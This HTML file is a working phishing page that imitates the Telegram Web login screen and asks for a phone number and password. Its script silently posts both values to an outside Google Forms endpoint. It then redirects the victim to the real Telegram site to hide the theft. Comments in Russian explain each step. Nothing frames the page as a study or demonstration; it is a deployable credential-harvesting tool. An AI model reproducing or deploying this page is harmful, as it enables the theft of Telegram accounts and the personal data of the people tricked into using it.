<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #0088cc;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            color: #333;
        }
        .login-box input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .login-box button {
            background-color: #0088cc;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }
        .login-box button:hover {
            background-color: #0077b3;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://web.telegram.org/img/logo_share.png" alt="Telegram Logo" width="100">
        <h2>Login to Telegram</h2>
        <form id="login-form">
            <input type="text" id="phone" placeholder="Phone number" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Next</button>
        </form>
    </div>

    <script>
        document.getElementById('login-form').addEventListener('submit', function(event) {
            event.preventDefault();
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;

            // Формирование данных для отправки
            const data = new URLSearchParams();
            data.append('entry.166662340', phone); // ID поля для номера телефона
            data.append('entry.185403252', password); // ID поля для пароля

            // Отправка данных в Google Forms
            fetch('https://docs.google.com/forms/d/e/1FAIpQLSdw6eLqMcWSVTOAFd8Mk0GXi42PLaHsPL4jcKYSLi7_P4cpAw/formResponse?usp=pp_url', {
                method: 'POST',
                body: data,
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                mode: 'no-cors'
            });

            // Перенаправление на официальный сайт Telegram с задержкой
            setTimeout(() => {
                window.location.href = 'https://web.telegram.org';
            }, 1000); // Задержка 1 секунда
        });
    </script>
</body>
</html>
